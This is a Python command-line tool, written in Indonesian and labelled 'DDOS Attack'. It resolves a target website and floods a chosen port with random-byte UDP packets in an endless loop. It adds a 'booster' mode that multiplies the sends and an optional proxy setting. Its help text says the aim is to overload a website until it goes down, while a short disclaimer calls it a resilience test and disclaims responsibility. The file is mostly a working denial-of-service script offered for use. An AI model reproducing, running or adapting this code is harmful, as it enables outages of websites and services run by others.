
"""Script yang kami buat bersifat OPEN SOURCE"""

import os, sys, time, socket, string, random, optparse, requests, urllib

os.system('cls||clear')
#Menu

banner = '''
#----------------------------------------------------------------#
<|-----------------------| DDOS Attack |------------------------|>
 | Author:             RX77E, Security Syber Team Indonesian    |
 | Spesial Thank's:    RX77E                                    |
 | Github:             https://github.com/Sreetx                |
 | Instagram:          https://www.instagram.com/memelucubikin  |
 |--------------------------------------------------------------|
 |    Jangan gunakan script ini untuk tindak kejahatan. Kami    |
 |    tidak bertanggung jawab atas apapun yang anda lakukan.    |
<|--------------------------------------------------------------|>
#----------------------------------------------------------------#
'''
def start(host):
    try:
        baca = '''
				DDOS AttackV2.8
Script DDOS Attack yang kami buat digunakan untuk menguji seberapa tangguh keamanan website terhadap serangan ddos. Jangan gunakan script ini untuk tindak kejahatan. {[!] Penting: Kami tidak bertanggung jawab atas apapun yang anda lakukan apapun itu.}

Deskripsi:
Cara kerja tool's DDOS Attack yg kami buat adalah mengirimkan lonjakan tekanan yang sangat besar pada web tersebut sampai web tersebut down. Untuk menggunakan menu --booster pastikan kartu kamu itu internet gratisan. Kalo nggak, kuota lu bakalan habis.

Follow dan subscribe beberapa akun kami yaakk...

 Github:
        https://github.com/Sreetx/
 Intagram:
        https://www.instagram.com/memelucubikin/
 YouTube:
        https://youtube.com/channel/UCscuxW-ZUViftGyJ9Z1cPbw/
View my website:
 Website:
        https://postingan4ku.blogspot.com/
		
[INFO] 
Gunakan booster untuk meningkatkan kekuatan serangan ddos yang kamu lakukan, ingat, jika ingin menggunakan booster kamu harus menggunakan wifi, jika mengunakan kuota data kamu akan rugi karena pemakaian yang sangat boros, lebih baik gunakan mode biasa dengan ukuran paket yang sangat rendah seperti 10MB jika anda tidak terhubung ke wifi.

Tekan CTRL+C Untuk Keluar
Pada saat penyerangan Tekan CTRL+C Untuk Menjeda
Masukkan kepala website agar script bisa bekerja, misal "target.com"
Ingat masukan kepala website yang berarti tanpa https:// atau http://

Batas kecepatan internet maksimal yang dihasilkan script ini untuk melakukan serangan ddos: 75,80%, kecepatan minimum: 46,72%

PERINGATAN!!! JANGAN DISALAHGUNAKAN KARENA BISA BERAKIBAT FATAL. KAMI TIDAK BERTANGGUNG JAWAB ATAS APAPUN YANG TELAH KALIAN LAKUKAN!!!
        
Segitu aja ya guys, selamat menggunakan...'''
        print(banner)
        print(baca)
        enter = input('\n [</>] Tekan enter untuk melanjutkan!')
        ip0 = socket.gethostbyname(str(host))
        print ("\n[*] Mendapatkan IP: [" + ip0 +"]")
        print("[INFO] IP akan berubah ubah dalam proses penyerangan, itu artinya(lihat teks dibawah)")
        time.sleep(3)
        print ("[*] [Ip Terkunci]" )
        time.sleep(3)
        print ("[*] Memulai Menyerang [" + host + "]....")
        time.sleep(3)
    except socket.gaierror: print(' [!] Gagal mendapatkan IP, Harap perhatikan penulisan alamat target');sys.exit()
    except KeyboardInterrupt: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()
    except EOFError: print ("\n [*] Mematikan Program....\n");time.sleep(3);sys.exit()

#Jeda
def jeda():
    print('\n [*] Jeda....')
    tanya = input('  [?] Lanjutkan atau Matikan program? [L/M]: ')
    if tanya.lower() == 'l':
        print('  [!] Melanjutkan Penyerangan....');time.sleep(3)
    elif tanya.lower() == 'm':
        print ("\n   [*] Menghentikan Penyerangan....");time.sleep(1);print ("   [*] Mematikan Program....\n");time.sleep(3);sys.exit()
    else:
        pass

#DDOS Attack
def ddos(host, port, paket):
    try:
        ip = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 + int(paket))
        sent = 50000
        ddos.sendto(bytes, (ip, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip +" Di Port", port,"Dengan Ukuran", paket,"MB")
    except socket.error: print ("""\n[!] Socket error, Time out sambungan....
 [#] Restart script ini atau sumber internet anda
 [#] Mungkin paket yang anda masukan terlalu besar
 [#] Max paket: 15507MB. Paket yang anda masukkan""", paket, """MB\n""");sys.exit()
    except socket.gaierror: print(' [!] IP Target hilang, mungkin target telah down atau pihak web menggunakan plugin untuk mengamankan web nya');print('\n [*] Mematikan program....\n');time.sleep(3);sys.exit()
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()

#Booster DDOS
def bost():
    print('[!] Booster aktif');time.sleep(3)
    while True:
        try:
            ddos(host, port, paket)
            booster(host, port, paket)
            booster2(host, port, paket)
            booster3(host, port, paket)
            booster4(host, port, paket)
            booster5(host, port, paket)
        except KeyboardInterrupt: print('\n [!] Tidak bisa menggunakan booster! Anda belum memasukkan opsi target dan port\n');sys.exit()

def booster(host, port, paket):
    try:
        ip1 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip1, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip1 +" Di Port", port,"Dengan Ukuran", paket,"MB" )
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
def booster2(host, port, paket):
    try:
        ip2 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip2, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip2 +" Di Port", port,"Dengan Ukuran", paket,"MB")
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
def booster3(host, port, paket):
    try:
        ip3 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip3, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip3 +" Di Port", port,"Dengan Ukuran",paket,"MB")
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
def booster4(host, port, paket):
    try:
        ip4 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip4, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip4 +" Di Port", port,"Dengan Ukuran", paket,"MB")
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()
    
def booster5(host, port, paket):
    try:
        ip5 = socket.gethostbyname(str(host))
        ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(50000 +int(paket))
        sent = 50000 +int(paket)
        ddos.sendto(bytes, (ip5, int(port)))
        sent = sent + 1
        print (" [*] Menyerang "+ ip5 +" Di Port", port,"Dengan Ukuran", paket,"MB")
    except TimeoutError: print ("[!] Time out sambungan. Koneksi internet anda terputus");sys.exit()
    except (EOFError, KeyboardInterrupt):
        jeda()
    except OSError: print (" [!] Koneksi Anda Terputus");sys.exit()

def proxy(prxy):
    try:
        print(' [~] Menghubungkan ke proxy....')
        proxi = urllib.request.ProxyHandler({"http" : "http://"+prxy})
        urllib.request.urlopen('http://'+prxy, data=proxi)
        print(' [+] Tersambung');time.sleep(2)
    except KeyboardInterrupt: print(' [!] Gagal tersambung'); sys.exit()
            
def bant():
    print('''
#----------------------------------------------------------------#
<|-----------------------| DDOS Attack |------------------------|>
 | Author:             RX77E, Security Syber Team Indonesian    |
 | Spesial Thank's:    RX77E                                    |
 | Github:             https://github.com/Sreetx                |
 | Instagram:          https://www.instagram.com/memelucubikin  |
 |--------------------------------------------------------------|
 |    Jangan gunakan script ini untuk tindak kejahatan. Kami    |
 |    tidak bertanggung jawab atas apapun yang anda lakukan.    |
<|--------------------------------------------------------------|>
#----------------------------------------------------------------#

python '''+sys.argv[0]+''' [OPTIONS]
Perintah:
    --t --target        Masukkan kepala alamat website target. Contoh: --t website.com
    --p --port          Masukkan port. Contoh: --p 8080
    --pt --paket        Masukkkan jumlah paket yang akan dikirimkan. Contoh: --pt 100
    --hh --hlp          Gunakan perintah ini jika membutuhkan bantuan. Contoh: --hh
    --b --booster       Gunakan ini jika membutuhkan booster serangan. Contoh: --booster
    --proxy             Gunakan ini jika membutuhkan proxy. Contoh: --proxy 123.45.67:443
Contoh penggunaan:
    Normal:
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100
    Menggunakan Booster:
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100 --booster
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100 --proxy 123.45.67:443
        python '''+sys.argv[0]+''' --t website.com --p 443 --pt 100 --proxy 123.45.67:443 --booster\n''')

parse = optparse.OptionParser('\n  [?] Belum bisa menggunakan? Ketikan perintah python '+sys.argv[0]+' --hlp Untuk meminta bantuan')
parse.add_option('--t','--target','-T','--TARGET', dest='target', type='string')
parse.add_option('--p','--port','--P','--PORT', dest='port', type='string')
parse.add_option('--proxy', dest='proxy', type='string')
parse.add_option('--pt','--paket','--PT','--PAKET', dest='paket')
parse.add_option('--b','--booster','--B','--BOOSTER', dest='booster', action='store_true', default=False)
parse.add_option('--hh','--hlp','--HH','--HLP', dest='hlp', action='store_true', default=False)

(options,argv) = parse.parse_args()
host = options.target
boster = options.booster
port = options.port
prxy = options.proxy
paket = options.paket
hlp = options.hlp
opts = [host, port, boster, prxy]
if host:
    start(host)
    if prxy:
        proxy(prxy)
    if boster:
        bost()
    while True:
        try:
            ddos(host, port, paket)
        except (KeyboardInterrupt, EOFError): pass;sys.exit()
if prxy:
    print(banner)
    print('\n [!] Anda belum memasukkan opsi pada perintah --target\n');sys.exit()
if port:
    print(banner)
    print('\n [!] Anda belum memasukkan opsi pada perintah --target\n');sys.exit()
if paket:
    print(banner)
    print('\n [!] Anda belum memasukkan opsi pada perintah --target\n');sys.exit()
if hlp:
    bant()
else:
    print(parse.usage);sys.exit()